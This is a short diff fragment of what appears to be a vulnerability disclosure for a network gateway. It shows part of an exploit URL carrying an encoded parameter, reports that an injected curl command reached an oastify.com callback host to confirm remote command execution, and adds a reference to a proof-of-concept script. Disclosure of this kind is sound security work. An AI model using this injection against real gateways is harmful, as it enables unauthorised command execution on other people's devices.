@@ -44,6 +44,8 @@ https://<GATEWAY_IP>:4433/login?nl.lang=0&title=1&oip=1&chkid=eydzVXNlckNvZGU6J2
 Verify Execution:
 As shown in the attached image, a DNS query log is observed on the oastify.com service from the target gateway's IP address (172.253.5.18), confirming that the curl command was successfully executed on the device. 
      <img width="830" height="130" alt="image" src="https://github.com/user-attachments/assets/25583a96-23da-40b3-a336-a632d1c2b1a1" />
+Use Shengxingzhe-poc.py
+<img width="1828" height="518" alt="image" src="https://github.com/user-attachments/assets/a36445fd-f849-44ab-841c-727a697fd39f" />
 
 
 Impact 
